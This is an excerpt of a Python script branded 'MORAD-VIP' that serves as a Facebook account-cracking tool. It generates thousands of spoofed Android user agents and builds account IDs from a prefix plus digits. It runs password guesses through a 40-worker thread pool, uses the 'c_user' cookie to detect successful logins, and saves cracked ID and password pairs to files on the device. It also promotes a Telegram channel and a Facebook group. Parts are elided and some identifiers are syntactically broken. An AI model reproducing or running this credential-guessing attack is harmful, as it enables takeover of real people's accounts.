...
for ua in range(10000):
      ...
      aMORAD-VIP=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(aMORAD-VIP)
for ua in range(10000):
	a='Mozilla/5.0 (Linux; Android'
...
\033[1;36m .::       .::    .::::     .::      .::.::         .::.:::::    
\033[1;91m╔═══════════════════════════════╗
\033[1;92m   NAME➼   •⎯͢⎯⃝🩵-⊰༎⊱🌸❐𝐌𝐎𝐑𝐀𝐃❐•⎯͢⎯⃝🩵-⊰༎⊱🌸
\033[1;31m   FACEBOOK➼⸨⸙⸩⟬𝐊𝐈𝐍𝐆 - 𝐌𝐎𝐑𝐀𝐃⟭⸨⸙⸩
\033[1;32m   TALEGRAM ➼ https://t.me/+fs9d4jssenY1MzU1
\033[1;91m╚═══════════════════════════════╝
""") 
...
def MORAD-VIP():
    ...
    print("\033[1;96m ╚═════════════════════════════════╝")
    print("")
    MORAD-VIP = input(f'\033[1;32m ՏᎬᏞᎬᏟͲᎬᎠ ƳϴႮᎡ ϴᏢͲᏆϴΝ :\033[1;36m ')
    if MORAD-VIP in ["1","A"]:
        MORAD-VIPs()
    if MORAD-VIP in ["2","B"]:
        os.system('xdg-open https://facebook.com/groups/311280858429214/')
...
def MORAD-VIPs():
    ...
    with ThreadPool(max_workers=40) as Fb_crack:
        ...
        for love in user:
            ...
            uid = code+love
            Fb_crack.submit(MORAD-VIPm,uid,pwx,tl)
    print("\033[1;91m╔═══════════════════════════╗")
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HACKED COMPLETE ')
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HI IM MORAD-VIP ')
    print("\033[1;91m╚═══════════════════════════╝")


def MORAD-VIPm(uid,pwx,tl):
    global loop
    global cps
    global oks
    global agents
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/MORAD-VIP-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/MORAD-VIP-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
